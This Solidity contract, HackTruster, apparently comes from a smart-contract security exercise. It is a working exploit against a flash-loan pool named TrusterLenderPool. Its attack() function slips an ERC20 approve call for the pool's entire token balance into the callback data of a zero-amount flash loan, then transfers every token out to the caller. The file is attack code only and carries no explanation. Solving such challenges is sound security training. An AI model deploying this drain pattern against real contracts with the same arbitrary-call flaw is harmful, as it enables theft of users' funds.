// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./TrusterLenderPool.sol";
import "hardhat/console.sol";

/**
 * @title HackTruster
 * @author Thadeu Tucci
 */
contract HackTruster {
    TrusterLenderPool pool;
    address poolAddress;
    address tokenAddress;
    constructor (address _pool, address _token) {
        poolAddress = _pool;
        tokenAddress = _token;
        pool = TrusterLenderPool(poolAddress);
    }

    function attack() public
    {
        uint256 poolBalance = IERC20(tokenAddress).balanceOf(poolAddress);
        bytes memory callData = abi.encodeWithSignature("approve(address,uint256)", address(this), poolBalance);
        pool.flashLoan(0, address(this), tokenAddress, callData);
        IERC20(tokenAddress).transferFrom(poolAddress, msg.sender, poolBalance);
    }
}
